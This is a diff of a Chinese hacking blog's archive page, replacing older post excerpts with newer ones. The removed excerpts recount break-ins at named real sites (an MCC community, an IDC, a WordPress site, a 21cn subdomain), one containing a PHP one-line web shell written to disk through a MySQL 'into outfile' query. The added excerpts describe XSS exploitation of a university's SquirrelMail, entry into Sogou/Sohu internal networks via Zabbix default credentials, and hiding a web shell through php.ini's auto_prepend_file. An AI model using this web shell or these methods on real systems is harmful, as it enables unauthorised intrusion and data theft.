@@ -45,29 +45,22 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-08-15T20:05:16.000Z" itemprop="datePublished">
-          2012-08-16
+      <time datetime="2013-07-25T18:14:31.000Z" itemprop="datePublished">
+          2013-07-26
       </time>
     
-    
-    | 
-    <a href='/tag/入侵/'>入侵</a>,
-    
-    <a href='/tag/提权/'>提权</a>
-    
-    
 </span>
-      <h2 class="post-title"><a href="/755.seo/">对mcc.net.cn的一次检测</a></h2>
+      <h2 class="post-title"><a href="/1016.seo/">PHP  将时间显示为 刚刚  n分钟 小时前 等</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>原文地址：法克论坛   <br />N久前的事情了 以前是独服的 现在旁站很多 检测原因:雅兰MJJ 在群里发的这个站，说没事大家去日它装逼。听说还是全国最大的MCC潮流社区。于是我就开始了邪恶之旅先踩点:网站是ASP的 IIS6.0 windows2003有个数据库雅兰下载来了不过得到的密</p>  <p>PS:N 久前的事情了 以前是独服的 现在旁站很多   <br /> 检测原因:雅兰MJJ 在群里发的这个站，说没事大家去日它装逼。听说还是全国最大的MCC潮流社区。    <br />于是我就开始了邪恶之旅    <br />先踩点:网站是ASP的 IIS6.0 windows2003    <br />有个数据库雅兰下载来了    <br />不过得到的密码是这个 +++++++++sadasc636++++    <br />哎 无果    <br />那就看旁站吧    <br /><a href="http://img.cker.in/mcc.net.cn_A915/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/mcc.net.cn_A915/clip_image001_thumb.jpg" width="806" height="554" /></a>    <br />有个论坛    <br />Bbs.mcc.net.cn    <br />论坛也是ASP的然后根据ICO 发现他是DVBBS 的程序    <br />版本未知</p>
+        在很多场合为了显示出信息的及时性，一般会将时间显示成“刚刚”，“5分钟前”，“3小时前”等，而不是直接将时间打印出来。比如微博，SNS类应用就最长用到这个功能。而一般存储在数据库中的时间格式为 Unix时间戳，所以这里记录一个将 Unix时间戳 转化为时间轴显示的PHP函数。   函数比较简单，直接看代码就很好懂了。      &lt;?phpdate_default_timezone_set(‘PRC’);$date = &quot;
       
       </p>
       
       <p>
-          <a href="/755.seo/" class="excerpt-link">Read More...</a>
+          <a href="/1016.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -76,44 +69,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-08-09T18:23:55.000Z" itemprop="datePublished">
-          2012-08-10
+      <time datetime="2013-07-22T18:47:10.000Z" itemprop="datePublished">
+          2013-07-23
       </time>
     
     
     | 
-    <a href='/tag/Wordpress/'>Wordpress</a>,
+    <a href='/tag/xss/'>xss</a>,
     
-    <a href='/tag/入侵/'>入侵</a>
+    <a href='/tag/squirrel-mail/'>squirrel mail</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/750.seo/">转国外]干掉一个wp站点</a></h2>
+      <h2 class="post-title"><a href="/1015.seo/">论升级的重要性,低版本squirrel mail的XSS利用实例</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>他站点（旁站：sameip.org）：</p>
-<p><a href="http://img.cker.in/wp_90E7/clip_image001.png" target="_blank"><img style="display: inline; border: 0px;" title="clip_image001" src="http://img.cker.in/wp_90E7/clip_image001_thumb.png" alt="clip_image001" width="541" height="296" border="0" /></a></p>
-<p><a href="http://sameip.org/">Same IP</a>   26 sites hosted on IP Address 173.236.138.113</p>
-<p style="text-align: justify;"><strong>IDDomainSite Link</strong>1</p>
-
-<p><pre>hijackthisforum.com<a href="http://www.hijackthisforum.com/">hijackthisforum.com</a>2sportforum.net<a href="http://www.sportforum.net/">sportforum.net</a>3freeonlinesudoku.net<a href="http://www.freeonlinesudoku.net/">freeonlinesudoku.net</a>4cosplayhell.com<a href="http://www.cosplayhell.com/">cosplayhell.com</a>5videogamenews.org<a href="http://www.videogamenews.org/">videogamenews.org</a>6gametour.com<a href="http://www.gametour.com/">gametour.com</a>7qualitypetsitting.net<a href="http://www.qualitypetsitting.net/">qualitypetsitting.net</a>8brendanichols.com<a href="http://www.brendanichols.com/">brendanichols.com</a>98ez.com<a href="http://www.8ez.com/">8ez.com</a>10hack-test.com<a href="http://www.hack-test.com/">hack-test.com</a>11kisax.com<a href="http://www.kisax.com/">kisax.com</a>12paisans.com<a href="http://www.paisans.com/">paisans.com</a>13mghz.com<a href="http://www.mghz.com/">mghz.com</a>14debateful.com<a href="http://www.debateful.com/">debateful.com</a>15jazzygoodtimes.com<a href="http://www.jazzygoodtimes.com/">jazzygoodtimes.com</a>16fruny.com<a href="http://www.fruny.com/">fruny.com</a>17vbum.com<a href="http://www.vbum.com/">vbum.com</a>18wuckie.com<a href="http://www.wuckie.com/">wuckie.com</a>19force5inc.com<a href="http://www.force5inc.com/">force5inc.com</a>20virushero.com<a href="http://www.virushero.com/">virushero.com</a>21twincitiesbusinesspeernetwork.com<a href="http://www.twincitiesbusinesspeernetwork.com/">twincitiesbusinesspeernetwork.com</a>22jennieko.com<a href="http://www.jennieko.com/">jennieko.com</a>23davereedy.com<a href="http://www.davereedy.com/">davereedy.com</a>24joygarrido.com<a href="http://www.joygarrido.com/">joygarrido.com</a>25prismapp.com<a href="http://www.prismapp.com/">prismapp.com</a>26utiligolf.com<a href="http://www.utiligolf.com/">utiligolf.com</a></pre><br>总计有26个站点在[173.236.138.113]这台服务器上。为了黑掉目标站点，许多黑客会把目标站点同服的其他站点也划入攻击范围内。但是出于学习的目的，我们今天暂且将其他站点放在一边。</p>
-<p>我们需要更多关于目标站点的信息（Ps：笔者认为在渗透测试过程中，这比实施测试的环节来得重要得多。），他们包括：</p>
-<p>1.DNS记录（A，NS，TXT，MX）</p>
-<p>2.WEB服务类型（IIS，APACHE，TOMCAT）</p>
-<p>3.域名注册者的信息（所持有域名公司等）</p>
-<p>4.目标站点管理员（相关人员）的姓名，电话，邮箱和住址等</p>
-<p>5.目标站点所支持的脚本类型（PHP，ASP，JSP，ASP.net，CFM）</p>
-<p>6.目标站点的操作系统（UNIX,LINUX,WINDOWS,SOLARIS）</p>
-<p>7.目标站点开放的端口</p>
-<p>让我们先来查询相关DNS记录吧，这里用的是 who.is：</p>
-<p><a href="http://img.cker.in/wp_90E7/clip_image002.png" target="_blank"><img style="display: inline; border: 0px;" title="clip_image002" src="http://img.cker.in/wp_90E7/clip_image002_thumb.png" alt="clip_image002" width="596" height="326" border="0" /></a></p>
+        <p>低版本的sqmail有几个xss洞…但是没有exploit…这次通过实例补充一下   <br />求不要跨省…我还要读几年书呢    <br />详细说明：    <br />香港科技大学喜欢使用<a href="http://Ha.Cker.In/tag/squirrel mail" target="_blank">squirrel mail</a>作为webmail后端    <br />屡次标榜先进性却不思升级…这不就跪了么    <br />这次实战的洞有CVE-2008-2379    <br />和一个老洞…但是sqmail的最新版好像也没完全修好    <br />先看看科大用的sqmail版本    <br />logout以后任意访问一个需要login的页面就可以了    <br /><a href="http://t.com/dx/wooyun_referer_pic.php?url=http://www.wooyun.org/upload/201306/0714484951b23cf830d7e8a14a83dc9733d6b35b.jpg"><img title="clip_image002" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="438" alt="clip_image002" src="http://img.cker.in/squirrelmailXSS_9766/clip_image002.jpg" width="620" border="0" /></a>    <br />1.4.10a恩…    <br /><a href="http://squirrelmail.org/security/">http://squirrelmail.org/security/</a>    <br />来看看对应版本有什么洞…    <br />我注意到的是    <br />2008-12-04&#160;&#160;&#160;&#160;&#160;&#160;&#160; Cross site scripting in HTML filter&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1.4.0 - 1.4.16&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160;&#160;&#160;&#160;&#160; CVE-2008-2379    <br />这个洞…先搜一下网上有没有现成的exploit好了….    <br />…     <br />没有…那就自己研究    <br />先看一下patch    <br /><a href="http://squirrelmail.svn.sourceforge.net/viewvc/squirrelmail/branches/SM-1_4-STABLE/squirrelmail/functions/mime.php?r1=13276&amp;r2=13338&amp;view=patch">http://squirrelmail.svn.sourceforge.net/viewvc/squirrelmail/branches/SM-1_4-STABLE/squirrelmail/functions/mime.php?r1=13276&amp;r2=13338&amp;view=patch</a>    <br />然后抓源码下来研究一番</p><br>
       
       </p>
       
       <p>
-          <a href="/750.seo/" class="excerpt-link">Read More...</a>
+          <a href="/1015.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -122,29 +100,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-08-09T18:13:46.000Z" itemprop="datePublished">
-          2012-08-10
+      <time datetime="2013-07-09T02:18:46.000Z" itemprop="datePublished">
+          2013-07-09
       </time>
     
     
     | 
-    <a href='/tag/入侵/'>入侵</a>,
-    
-    <a href='/tag/idc/'>idc</a>
+    <a href='/tag/zabbix/'>zabbix</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/747.seo/">对IDC的一次检测</a></h2>
+      <h2 class="post-title"><a href="/1014.seo/">看我是如何利用zbbix渗透sogou&sohu内网的</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>群里兄弟抛来一个站点，说要弄C段的另一个站点。看看，该IDC站点有数据备份后台，弱口令进入。   <br /><a href="http://img.cker.in/IDC_8FAD/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/IDC_8FAD/clip_image002_thumb.jpg" width="620" height="452" /></a>    <br />一、拿个shell    <br />php站点，mysql数据库，可以sql备份、导入、导出、执行SQL，没有上传，root权限。    <br />但是找不到站点的绝对路径，群里兄弟就找找周围的站点，希望能得到某个站点的绝对路径，    <br />不久就爆出一个php的站点，准备mysql导出shell，但网站有注入检测系统，导入不成功，原因有：    <br />（1）路径不对；    <br />（2）root被降权，没有权限写；    <br />（3）被检测到恶意代码；    <br />前几天碰到过这种情况，改了</p>  <p>1. Select ‘&lt;?php @eval($_POST[cmd])?&gt;; ‘ into/**/outfile……../b.php’，OK</p>  <p>复制代码</p>  <p>连接成功。得到一个旁站的php shell。   <br />测试了结果：    <br />(1)执行命令不行；    <br />(2)只能在本站转；    <br />什么也干不了。    <br />二、再拿php、asp&#160; shell    <br />后来有人把mysql的root密码破了，登陆phpmyadmin，直接进行数据库操作。用mysql客户端登陆没有登陆上。    <br />上php大马，udf提权也失败了，原因不明。旁站的php shell权限很小，想到能利用的真不多。    <br />又有人得到一个asp旁站的shell，上去看了，除了数据库组件、fso、mai组件外，其他都不能用，难怪不能执行cmd。    <br />陆续又得到几个旁站的shell，都市php和asp的，能利用的少。</p>
+        <p>手机搜狗好像不是很好用唉；   <br />在乌云浏览搜狗历史漏洞的时候得到220.<em>.</em>.<em>其中的一个ip    <br />具体是那个漏洞记不住了。    <br />对220.</em>.<em>.0/26进行 8080端口扫描，没有啥重大发现    <br />对220.</em>.<em>.0/26进行 80端口扫描，有重大发现了    <br /><a href="http://220">http://220</a>.</em>.<em>.</em>/zabbix/    <br />再往下</p>  <p>&#160;</p>  <p><a href="http://220.181.*.128/zabbix/">http://220.181.*.128/zabbix/</a>   <br />默认口令：admin/zabbix    <br /><a href="http://t.com/dx/wooyun_referer_pic.php?url=http://www.wooyun.org/upload/201305/091757388a1afd9667de6dd56019a79f6802fea6.jpg"><img title="clip_image002" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="311" alt="clip_image002" src="http://img.cker.in/zbbixsogousohu_10160/clip_image002.jpg" width="620" border="0" /></a>    <br />没多少机器，目测是个测试的<a href="http://Ha.Cker.In/tag/zabbix" target="_blank">zabbix</a>？    <br />随便找了个机器 添加了一个items直接使用system.run 跑了一个命令，没有数据返回，确定zabbix agent没有开启system.run 模块    <br />不过zabbix还有一个Scripts的功能，可以对zabbix server 执行任意命令</p><br>
       
       </p>
       
       <p>
-          <a href="/747.seo/" class="excerpt-link">Read More...</a>
+          <a href="/1014.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -153,75 +129,22 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-08-08T20:57:54.000Z" itemprop="datePublished">
-          2012-08-09
+      <time datetime="2013-07-09T02:13:12.000Z" itemprop="datePublished">
+          2013-07-09
       </time>
     
-    
-    | 
-    <a href='/tag/Apache/'>Apache</a>,
-    
-    <a href='/tag/Mysql/'>Mysql</a>,
-    
-    <a href='/tag/php/'>php</a>,
-    
-    <a href='/tag/Linux-Mint/'>Linux Mint</a>,
-    
-    <a href='/tag/LNMP/'>LNMP</a>
-    
-    
 </span>
-      <h2 class="post-title"><a href="/742.seo/">LinuxMint安装Lamp</a></h2>
+      <h2 class="post-title"><a href="/1013.seo/">如何渗透PayPal(贝宝)用户交易记录系统</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <h5><a href="http://ha.cker.in/tag/LinuxMint" target="_blank">LinuxMint</a>安装Apache2 Web服务</h5>  <p>VPS 默认有安装Apache2，但如果你删除了，就需要重新安装；如果没有删除，执行下面的命令会退出来，不会对系统产生任何影响。</p>  <p>输入如下命令安装</p>  <pre>sudo apt-get install apache2</pre><br><br><p>正常情况下会给出如下提示，说明Apache2默认已经安装好了：</p><br><br><pre><br />$sudo apt-get install apache2<br>Reading package lists… Done<br>Building dependency tree… Done<br>apache2 is already the newest version.<br>0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</pre><br><a name=".E5.BC.80.E5.90.AF_Apache2_.E7.9A.84.E4.BC.AA.E9.9D.99.E6.80.81"></a><br><br><h5>开启 Apache2 的伪静态</h5>
-
-<p>如果希望开启Apache2 伪静态 rewrite 支持，输入如下命令安装</p>
-
-<pre>#a2enmod rewrite</pre>
-
-<p>正常情况下会给出如下提示，说明已经安装成功：</p>
-
-<pre>#a2enmod rewrite
-Module rewrite installed; run /etc/init.d/apache2 force-reload to enable.</pre>
-
-<p>提示需要重新加载Apache2的配置，由于下一步是安装mysql，所以暂时不用重启。</p>
-
-<p>或出现如下提示，表示已经开启了 rewrite</p>
-
-<pre># a2enmod rewrite
-Mudule rewrite already enabled</pre>
-<a name=".E5.AE.89.E8.A3.85_mysql_.E6.95.B0.E6.8D.AE.E5.BA.93.E6.9C.8D.E5.8A.A1"></a>
-
-<h5><strong>安装 mysql 数据库服务</strong></h5>
-
-<p>安装mysql前，#1的vps需要先关闭apache2，因为mysql的安装会初始化数据，占了很大内存，如果apache2不关闭，有可能导致安装mysql失败。</p>
-
-<p>1 输入如下命令关闭 apache2</p>
-
-<pre>$sudo service apache2 stop
-如果输入正确，会提示如下信息，表示apache2已经停止</pre>
-
-<pre><a href="http://img.cker.in/LinuxMintLnmpLamp_35CE/image.png" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="image" border="0" alt="image" src="http://img.cker.in/LinuxMintLnmpLamp_35CE/image_thumb.png" width="659" height="101" /></a> </pre>
-
-<p>2 输入如下命令安装mysql</p>
-
-<pre>$apt-get install mysql-server</pre>
-
-<p>如果输入正确，会提示如下信息：</p>
-
-<p><a href="http://img.cker.in/LinuxMintLnmpLamp_35CE/image_3.png" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="image" border="0" alt="image" src="http://img.cker.in/LinuxMintLnmpLamp_35CE/image_thumb_3.png" width="773" height="731" /></a> </p>
-
-<p>等待中……</p>
-
-<p>继续安装 会提示输入 mysql 的 root 用户密码，你可以输入密码后回车，也可以不输入任何密码直接回车。 （不输入密码不会影响到Mysql的安全性，因为Mysql仅仅用于本地监听，但不输入密码会导致后续phpmyadmin无法运行）</p>
+        <p><b>*</b>本文由以色列Break Security公司CEO兼创始人Nir Goldshlager撰写，并由IDF实验室志愿者张俊翻译。</p>  <p>今天我来介绍一下我之前是如何攻入PayPal记录系统的，这个BUG已经被反馈给了Paypal安全团队并立即得到了修补。</p>  <p>利用这个漏洞，攻击者可以完全访问PayPal的用户交易记录。在这些记录里，你可以找到如下的用户信息：</p>  <p>· 购物地址</p>  <p>· 电子邮箱</p>  <p>· 电话号码</p>  <p>· 商品名称</p>  <p>· 购买数量</p>  <p>· 用户全名</p>  <p>· 交易号</p>  <p>· 发票号</p>  <p>· 交易主体</p>  <p>· 账户名</p>  <p>· Paypal参考编号</p>  <p>等等……</p>  <p>首先，在PayPal的用户界面，这里有一个“交易记录”的选项：</p>  <p><a href="http://blog.idf.cn/wp-content/uploads/2013/06/reportsopton.jpg"><img title="clip_image002" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="400" alt="clip_image002" src="http://img.cker.in/PayPal_FFFA/clip_image002.jpg" width="753" border="0" /></a></p>  <p>通常，用户可以通过这个选项来访问自己购买过的商品记录。</p><br>
       
       </p>
       
       <p>
-          <a href="/742.seo/" class="excerpt-link">Read More...</a>
+          <a href="/1013.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -230,27 +153,27 @@ Mudule rewrite already enabled</pre>
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-08-08T11:57:47.000Z" itemprop="datePublished">
-          2012-08-08
+      <time datetime="2013-07-03T22:30:53.000Z" itemprop="datePublished">
+          2013-07-04
       </time>
     
     
     | 
-    <a href='/tag/渗透/'>渗透</a>
+    <a href='/tag/一句话/'>一句话</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/739.seo/">对21cn分站的检测</a></h2>
+      <h2 class="post-title"><a href="/1012.seo/">利用php.ini隐藏一句话</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>原文地址：法克论坛   <br />作者：泪少    <br />网址：<a href="http://zhao.21cn.com（漏洞站点的域名/URL）">http://zhao.21cn.com（漏洞站点的域名/URL）</a></p>  <p>站点：天翼关爱 电信旗下21分站 （漏洞站点的名字，记得是全称）</p>  <p>风险一   <br />风险描述：后台列目录 可以下载源文件 从文件找到mysql的密码 找到mysql库里查询后台登录地址 进一步<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a> （这里你发现的是什么漏洞就写什么漏洞）    <br />风险示例：    <br /><a href="http://img.cker.in/21cn_3785/clip_image001.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/21cn_3785/clip_image001_thumb.png" width="497" height="395" /></a></p>
+        利用php中的一个自动在文件中增加页眉和页脚的功能，隐藏一句话。   在站点的某一目录（如：根目录）下编辑文件php脚本文件，名称为：info.php，内容如下   &lt;?php    Phpinfo();    ?&gt;    在本地打开如：http://127.0.0.1/info.php    检查系统使用的配置文件      找到并编辑该配置文件   如下行：    auto_prepend_file =test.php&
       
       </p>
       
       <p>
-          <a href="/739.seo/" class="excerpt-link">Read More...</a>
+          <a href="/1012.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -259,27 +182,22 @@ Mudule rewrite already enabled</pre>
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-08-08T05:14:22.000Z" itemprop="datePublished">
-          2012-08-08
+      <time datetime="2013-07-03T20:36:03.000Z" itemprop="datePublished">
+          2013-07-04
       </time>
     
-    
-    | 
-    <a href='/tag/backtrack/'>backtrack</a>
-    
-    
 </span>
-      <h2 class="post-title"><a href="/736.seo/">BackTrack 5中启用SSH服务</a></h2>
+      <h2 class="post-title"><a href="/1011.seo/">修改root密码--当你把密码忘记之后！（简易教程）</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        BackTrack 5启用SSHD服务后我们看到22端口已经开启，依然无法从远程连接    连接时会有提示：    Read from socket failed: Connection reset by peer     通过以下几步生成密钥对即可连接：     #/etc/init.d/ssh restart     #ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key     #ssh-k
+        越狱后的iphone默认root密码是alpine，这个连地球之外的火星人都知道了，有点安全意识的人一般会第一时间更改它。   问题来了，有人很久没用root密码，忘了，怎么办？重刷？不必！   工具：依然是强大的iFile。   Cydia里添加威锋源，搜索ifile安装   root密码文件存放地方：/etc/master.passwd   用iFile的文本编辑功能打开master.passwd   你会找到类似这样的一行字符——
       
       </p>
       
       <p>
-          <a href="/736.seo/" class="excerpt-link">Read More...</a>
+          <a href="/1011.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -287,7 +205,7 @@ Mudule rewrite already enabled</pre>
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/archives/page/19/">← Newer Posts</a>
-    <span class="page-number">Page 20 of 57</span>
+    <span class="page-number">Page 20 of 81</span>
     <a class="older-posts" href="/archives/page/21/">Older Posts →</a>
   </nav>
 </main>
